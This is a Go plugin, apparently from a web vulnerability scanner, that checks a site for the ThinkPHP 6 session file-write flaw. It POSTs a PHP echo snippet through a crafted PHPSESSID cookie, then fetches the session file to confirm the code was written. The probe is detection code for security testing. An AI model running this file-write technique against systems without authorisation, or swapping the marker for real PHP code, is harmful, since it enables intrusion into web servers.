/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package thinkphp

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type V6FileWrite struct{}

func (*V6FileWrite) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection thinkphp/v6-filewrite, %s", flow.Request.URL())

			marker := utils.RandLetters(8)

			// TP6 session file write detection
			// Step 1: Write payload via session
			reqUrl, err := flow.Request.URL().Parse("/index.php/index/index/index")
			if err != nil {
				return nil
			}
			req, err := http.NewRequest("POST", reqUrl.String(),
				strings.NewReader(fmt.Sprintf("<?php echo '%s';?>", marker)))
			if err != nil {
				return nil
			}
			req.SetHeader("Cookie", fmt.Sprintf("PHPSESSID=%s", marker))

			_, err = ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}

			// Step 2: Try to access session file to verify write
			// Session files are typically located in /runtime/session/ directory
			sessionPaths := []string{
				fmt.Sprintf("/runtime/session/sess_%s", marker),
				fmt.Sprintf("/runtime/session/%s.php", marker),
			}
			for _, sessionPath := range sessionPaths {
				verifyUrl, err := flow.Request.URL().Parse(sessionPath)
				if err != nil {
					continue
				}
				verifyReq, err := http.NewRequest("GET", verifyUrl.String(), nil)
				if err != nil {
					continue
				}
				verifyRes, err := ab.HTTPClient.Respond(ctx, verifyReq)
				if err != nil {
					continue
				}
				if strings.Contains(verifyRes.Text, marker) {
					vul := ab.NewWebVuln(verifyReq, verifyRes, nil)
					if vul != nil {
						vul.SetTargetURL(flow.Request.URL())
						vul.Payload = fmt.Sprintf("session file write with marker: %s", marker)
						ab.OutputVuln(vul)
					}
					return nil
				}
			}

			return nil
		},
		Channel: "website",
		Binding: &model.VulnBinding{
			ID:       "thinkphp/v6-file-write/default",
			Plugin:   "thinkphp/v6-file-write/default",
			Category: "thinkphp/v6-file-write/default",
			Severity: model.SeverityHigh,
		},
	}
}
